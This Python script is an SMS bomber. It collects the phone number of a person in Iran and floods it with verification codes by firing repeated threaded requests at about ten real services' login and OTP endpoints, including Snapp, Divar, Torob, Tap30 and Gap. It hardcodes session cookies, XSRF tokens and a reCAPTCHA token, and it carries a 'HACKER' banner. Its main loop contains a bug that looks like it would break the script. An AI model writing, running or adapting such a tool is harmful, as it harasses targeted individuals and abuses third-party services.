from platform import node, system, release
Node, System, Release = node(), system(), release()
from os import system, name; system('clear' if name == 'posix' else 'cls')
from os import system as os_system, name
from re import match, sub
from concurrent.futures import ThreadPoolExecutor
import urllib3
from requests import get, post
from threading import Thread

def smarket(phone):
    smarketU = f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{phone.split("+98")[1]}'
    smarketH = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'text/plain;charset=UTF-8',
        'origin': 'https://snapp.market',
        'referer': 'https://snapp.market/',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33'
    }
    try:
        smarketR = post(timeout=2, url=smarketU, headers=smarketH).json()
        if smarketR['status']:
            print(f'{w}(SnapMarket) {r}Code Was Sent')
            return True
    except:
        pass

def okorosh(phone):
    okJ = {
        "mobile": "0" + phone.split("+98")[1],
        "g-recaptcha-response": "03AGdBq255m4Cy9SQ1L5cgT6yD52wZzKacalaZZw41D-jlJzSKsEZEuJdb4ujcJKMjPveDKpAcMk4kB0OULT5b3v7oO_Zp8Rb9olC5lZH0Q0BVaxWWJEPfV8Rf70L58JTSyfMTcocYrkdIA7sAIo7TVTRrH5QFWwUiwoipMc_AtfN-IcEHcWRJ2Yl4rT4hnf6ZI8QRBG8K3JKC5oOPXfDF-vv4Ah6KsNPXF3eMOQp3vM0SfMNrBgRbtdjQYCGpKbNU7P7uC7nxpmm0wFivabZwwqC1VcpH-IYz_vIPcioK2vqzHPTs7t1HmW_bkGpkZANsKeDKnKJd8dpVCUB1-UZfKJVxc48GYeGPrhkHGJWEwsUW0FbKJBjLO0BdMJXHhDJHg3NGgVHlnOuQV_wRNMbUB9V5_s6GM_zNDFBPgD5ErCXkrE40WrMsl1R6oWslOIxcSWzXruchmKfe"
    }
    okU = 'https://my.okcs.com/api/check-mobile'
    okH = {
        'accept': 'application/json, text/plain, */*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json;charset=UTF-8',
        'cookie': '_ga=GA1.2.1201761975.1639324247; XSRF-TOKEN=eyJpdiI6IllzYkQvdHJ5NVp3M1JyZmYweWFDTGc9PSIsInZhbHVlIjoiZ0wxQUZjR2ZzNEpPenFUZUNBZC95c2RFaEt4Y2x4VWJ2QlBmQ1ZIbUJHV2VEOGt0VG1XMXBaOVpJUFBkK2NOZmNvckxibDQ5cDkxc2ZJRkhJQUY4RlBicU80czIvZWhWZm1OSnJZMXZEbXE4TnlVeGZUSDhSYU9PRzZ6QzZGMkYiLCJtYWMiOiI2NWZlOTkxMTBjZDA5NzkyNDgwMjk2NGEwMDQzMGVhM2U1ODEzNmQ1YjExY2Q1ODc5MDFmZDBhMmZjMjQwY2JjIn0%3D; myokcs_session=eyJpdiI6InlYaXBiTUw1dHFKM05rN0psNjlwWXc9PSIsInZhbHVlIjoiNDg1QWJQcGwvT3NUOS9JU1dSZGk2K2JkVlNVV2wrQWxvWGVEc0d1MDR1aTNqVSs4Z0llSDliMW04ZFpGTFBUOG82NEJNMVFmTmNhcFpzQmJVTkpQZzVaUEtkSnFFSHU0RFprcXhWZlY0Zit2UHpoaVhLNXdmdUZYN1RwTnVLUFoiLCJtYWMiOiI5NTUwMmI2NDhkNWJjNDgwOGNmZjQxYTI4YjA0OTFjNTQ5NDc0YWJiOWIwZmI4MTViMWM0NDA4OGY5NGNhOGIzIn0%3D',
        'origin': 'https://my.okcs.com',
        'referer': 'https://my.okcs.com/',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33',
        'x-requested-with': 'XMLHttpRequest',
        'x-xsrf-token': 'eyJpdiI6IllzYkQvdHJ5NVp3M1JyZmYweWFDTGc9PSIsInZhbHVlIjoiZ0wxQUZjR2ZzNEpPenFUZUNBZC95c2RFaEt4Y2x4VWJ2QlBmQ1ZIbUJHV2VEOGt0VG1XMXBaOVpJUFBkK2NOZmNvckxibDQ5cDkxc2ZJRkhJQUY4RlBicU80czIvZWhWZm1OSnJZMXZEbXE4TnlVeGZUSDhSYU9PRzZ6QzZGMkYiLCJtYWMiOiI2NWZlOTkxMTBjZDA5NzkyNDgwMjk2NGEwMDQzMGVhM2U1ODEzNmQ1YjExY2Q1ODc5MDFmZDBhMmZjMjQwY2JjIn0='
    }
    try:
        okR = post(timeout=2, url=okU, headers=okH, json=okJ).text
        if 'success' in okR:
            print(f'\033[32;1m(OfoghKourosh) {r}Code Was Sent')
            return True
    except:
        pass

def snap(phone):
    snapH = {
        "Host": "app.snapp.taxi",
        "content-length": "29",
        "x-app-name": "passenger-pwa",
        "x-app-version": "5.0.0",
        "app-version": "pwa",
        "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
        "content-type": "application/json",
        "accept": "*/*",
        "origin": "https://app.snapp.taxi",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://app.snapp.taxi/login/?redirect_to=/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "fa-IR,fa;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6",
        "cookie": "_gat=1"
    }
    snapD = {"cellphone": phone}
    try:
        snapR = post(timeout=2, url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD).text
        if "OK" in snapR:
            print(f'\033[32;1m(Snap) \033[1;37mCode Was Sent')
            return True
    except:
        pass

def five(phone):
    a = "http://followmember2022.ir/followmember/client_webservices4.php"
    b = f"ac=10&phonenumber={phone}&token=CLTRIcCmcT&serial=null"
    d = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "58",
        "Host": "followmember2022.ir",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/3.12.1"
    }
    try:
        post(a, data=b, headers=d, timeout=2)
    except:
        pass

def seven(phone):
    a = "https://homa.petabad.com/customer/signup"
    b = f"my_server_api_version=1&platform=android&my_app_type=android&my_app_version=17&time_zone_offset=270&app_name=customer&phone_number={phone}"
    d = {
        "user-agent": "Dart/2.14 (dart:io)",
        "content-type": "application/x-www-form-urlencoded; charset=utf-8",
        "accept-encoding": "gzip",
        "content-length": "142",
        "host": "homa.petabad.com"
    }
    try:
        post(a, data=b, headers=d, timeout=2)
    except:
        pass

def fifty(phone):
    a = "https://gharar.ir/api/v1/users/"
    b = {"phone": phone}
    d = {
        "Host": "gharar.ir",
        "appversion": "1.5.4",
        "content-type": "application/json; charset=UTF-8",
        "content-length": "23",
        "accept-encoding": "gzip",
        "user-agent": "okhttp/4.9.2"
    }
    try:
        post(a, json=b, headers=d, timeout=2)
    except:
        pass

def gap(phone):
    gapH = {
        "Host": "core.gap.im",
        "accept": "application/json, text/plain, */*",
        "x-version": "4.5.7",
        "accept-language": "fa",
        "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
        "appversion": "web",
        "origin": "https://web.gap.im",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://web.gap.im/",
        "accept-encoding": "gzip, deflate, br"
    }
    try:
        gapR = get(timeout=2, url=f"https://core.gap.im/v1/user/add.json?mobile=%2B{phone.split('+')[1]}", headers=gapH).text
        if "OK" in gapR:
            print(f'\033[32;1m(Gap) \033[1;37mCode Was Sent')
            return True
    except:
        pass

def tap30(phone):
    tap30H = {
        "Host": "tap33.me",
        "Connection": "keep-alive",
        "Content-Length": "63",
        "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
        "content-type": "application/json",
        "Accept": "*/*",
        "Origin": "https://app.tapsi.cab",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://app.tapsi.cab/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "fa-IR,fa;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6"
    }
    tap30D = {"credential": {"phoneNumber": "0" + phone.split("+98")[1], "role": "PASSENGER"}}
    try:
        tap30R = post(timeout=2, url="https://tap33.me/api/v2/user", headers=tap30H, json=tap30D).json()
        if tap30R['result'] == "OK":
            print(f'\033[32;1m(Tap30) \033[1;37mCode Was Sent')
            return True
    except:
        pass

def divar(phone):
    divarH = {
        'accept': 'application/json, text/plain, */*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://divar.ir',
        'referer': 'https://divar.ir/',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
        'x-standard-divar-error': 'true'
    }
    divarD = {"phone": phone.split("+98")[1]}
    try:
        divarR = post(timeout=2, url="https://api.divar.ir/v5/auth/authenticate", headers=divarH, json=divarD).json()
        if divarR["authenticate_response"] == "AUTHENTICATION_VERIFICATION_CODE_SENT":
            print(f'\033[32;1m(Divar) \033[1;37mCode Was Sent')
            return True
    except:
        pass

def torob(phone):
    phone = '0' + phone.split('+98')[1]
    torobH = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'cookie': 'abtest=next_pwa; search_session=ofwjiyqqethomevqrgzxvopjtgkgimdc; _gcl_au=1.1.805505755.1639260830; _gid=GA1.2.683761449.1639260830; _gat_UA-105982196-1=1; _ga_CF4KGKM3PG=GS1.1.1639260830.1.0.1639260830.0; _clck=130ifw1|1|ex6|0; _ga=GA1.2.30224238.1639260830',
        'origin': 'https://torob.com',
        'referer': 'https://torob.com/',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
    }
    try:
        torobR = get(timeout=2, url=f"https://api.torob.com/a/phone/send-pin/?phone_number={phone}", headers=torobH).json()
        if torobR["message"] == "pin code sent":
            print(f'\033[32;1m(Torob) \033[1;37mCode Was Sent')
            return True
    except:
        pass

def is_phone(phone: str):
    phone = sub("\s+", "", phone.strip())
    if match(r"^\+989[0-9]{9}$", phone):
        return phone
    elif match(r"^989[0-9]{9}$", phone):
        return f"+{phone}"
    elif match(r"^09[0-9]{9}$", phone):
        return f"+98{phone[1:]}"
    elif match(r"^9[0-9]{9}$", phone):
        return f"+98{phone}"
    else:
        return False

def print_low(text):
    print(text)

r = '\033[1;31m'
g = '\033[32;1m'
y = '\033[1;33m'
w = '\033[1;37m'

print_low(f"""
{y}𝐆𝐄𝐍𝐄𝐑𝐀𝐓𝐄𝐃 𝐁𝐘 : @𝐏𝐀𝐑𝐒𝐀_𝐆𝐓𝐈𝟔
{g}ＩＲＡＮ --- ＨＡＣＫＥＲ
{w}ＩＲＡＮ --- ＨＡＣＫＥＲ
{r}ＩＲＡＮ --- ＨＡＣＫＥＲ
{y} ＰＡＲＳＡ ＨＡＣＫＥＲ
""")

def vip(phone, tedad):
        for kos in range(int(phone)):
            Thread(target=gap, args=[phone]).start()
            Thread(target=five, args=[phone]).start()
            Thread(target=seven, args=[phone]).start()
            Thread(target=fifty, args=[phone]).start()
            Thread(target=tap30, args=[phone]).start()
            Thread(target=torob, args=[phone]).start()
            Thread(target=divar, args=[phone]).start()
            Thread(target=snap, args=[phone]).start()
            Thread(target=smarket, args=[phone]).start()
            Thread(target=okorosh, args=[phone]).start()
while True:
    phone = is_phone(input(f'{g}[?] {w}Enter Phone Number {g}(+98) {r}- {w}'))
    if phone:
        break

try:
    tedad = float(input(f'{r}[?] {g}Enter Random Number : '))
except ValueError:
    tedad = 0
    print(f"{r}Invalid!")

try:
    vip(phone, tedad)
except KeyboardInterrupt:
    exit(f'{r}[-] User Exited')
except Exception as e:
    print(f'{r}[-] Error: {str(e)}')